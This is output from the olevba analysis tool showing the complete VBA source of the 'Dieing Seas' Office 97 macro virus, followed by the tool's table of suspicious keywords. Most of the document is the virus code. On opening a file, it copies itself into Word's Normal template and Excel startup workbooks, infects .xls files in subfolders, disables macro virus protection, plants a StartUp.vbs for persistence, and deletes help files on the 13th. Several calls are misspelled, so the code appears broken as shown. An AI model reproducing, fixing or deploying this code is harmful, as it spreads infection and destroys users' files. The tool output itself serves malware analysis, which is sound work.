olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.DieingSeas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.DieingSeas - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DieingSeas.bas 
in file: Virus.MSWord.Intended.DieingSeas - OLE stream: 'Macros/VBA/DieingSeas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub DieLikeEver1()
On Error Resume Next
Dim an As Boolean, ar As Boolean
VBA.SetAttr NormalTemplate.FullName, vbNormal
Options.SaveNormalPrompt = 1 - 1
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\ra"
Set nonono = NormalTemplate.VBProject.VBComponents
Set acacac = ActiveDocument.VBProject.VBComponents
For x = 1 To nonono.Count
If nonono(x).Name = "DieingSeas" Then an = True
Next x
For f = 1 To acacac.Count
If acacac(f).Name = "DieingSeas" Then ar = True
Next f
If an = True And ar = False Then acacac.import "c:\ra"
If an = False And ar = True Then nonono.impory "c:\ra"
Kill "c:\ra"
End Sub
Sub AutoOpen()
On Error Resume Next
DieLikeEvery1
JmpToExcell
SickBomb
RunAtStartUp
End Sub
Sub SickBomb()
On Error Resume Next
If Day(Now) = 13 Then
MsgBox "We are Just A Drop In The Ocean!", vbApplicationModal, "Dieing Seas"
Do
Ram = InputBox("Give me a word!", "Now")
Loop Until Ram = "Die"
MsgBox "Die"
Kill "c:\windows\help\*.cnt"
End If
End Sub
Sub RunAtStartUp()
On Error Resume Next
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\windows\system\code.infected"
Kill "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs"
Open "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs" For Random As vbs
Print vbs; "On Error Resume Next"
Print vbs; "Set WordObj=CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print vbs; "Set NT=WordObj.NormalTemplate"
Print vbs; "NT.VBproject.Vbcomponents.import " & Chr(34) & "C:\windows\system\code.infected" & Chr(34)
Print vbs; "nt.save"
Print vbs; "WordObj.Close"
Close vbs
End Sub
Sub JumpToExcell()
On Error Resume Next
Set Exc = CreateObject("Excel.Application")
SetAttr Exc.StartupPath & "\book1.", vbNormal
Set nr = Exc.Workbooks.Add
Set rt = nr.Vbprojects.VBComponents("ThisWorkBook").CodeModule
rt.InserLines 1, VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 123)
nr.SaveAs Exc.StatUpPath & "\book1."
nr.Close
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.ScreenUpdating = (4 - 4)
Application.EnableCancelKey = xlDisabled
Options.VirusProtection = (0 - 0)
If (Dir(Application.StartupPath & "\Book1.")) <> "" Then
SetAttr Application.StartupPath * "\Book1.", vbNormal
End If
Set Grand = Workbooks.Add
Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
f = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 123)
Grand.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
Grand.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
Grand.Close
Set fs = Application.FileSearch
fs.NewSearch
fs.LookIn = ActiveWorkbook.Path
fs.FileName = "*.xls"
fs.SearchSubFolders = True
fs.Execute msoSortByFileName
For x = 1 To fs.FoundFiles.Count
Set tEmp = Workbooks.Open(fs.FoundFiles(x))
If tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 1) <> "Sub DieLikeEvery1()" Then
tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
Source = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 123)
tEmp.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
tEmp.Save
End If
tEmp.Close
Next x
Application.ScreenUpdating = True
SickBomb
JmpWord
End Sub
Sub JmpWord()
On Error Resume Next
conte = VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 123)
Set wordobj = CreateObject("Word.Application")
Set nt = wordobj.NormalTemplate.VBProject.VBComponents
Set fso = CreateObject("Scripting.FileSystemObject")
Kill "c:\ra"
Set r = fso.opentextfile("C:\ra", 2, True)
r.writeline "Attribute VB_Name = " & Chr(34) & "DieingSeas" & Chr(34)
r.writeline conte
r.Close
nt.import "c:\ra"
wordobj.NormalTemplate.Save
Kill "c:\ra"
wordobj.Quit
End Sub
Sub ViewVbCode()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Sub ToolsMacro()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Rem +++++++++Dieing Seas Office 97 Virus+++++++++
Rem This is a little bug that infects excel and
Rem Word at the same time :-)
Rem It isn't very good bcoz too much work lately
Rem Also it's stealth Sux
Rem In a newer Version Everything will be differnt
Rem ++++++++++++++++++++++++++++++++++++++++++++++
Rem Created By Yozak=00= for MetaPhase :-) greetz to Knowdeth & bsl4

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |StartUp.vbs         |Executable file name                         |
|IOC       |viewcode.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

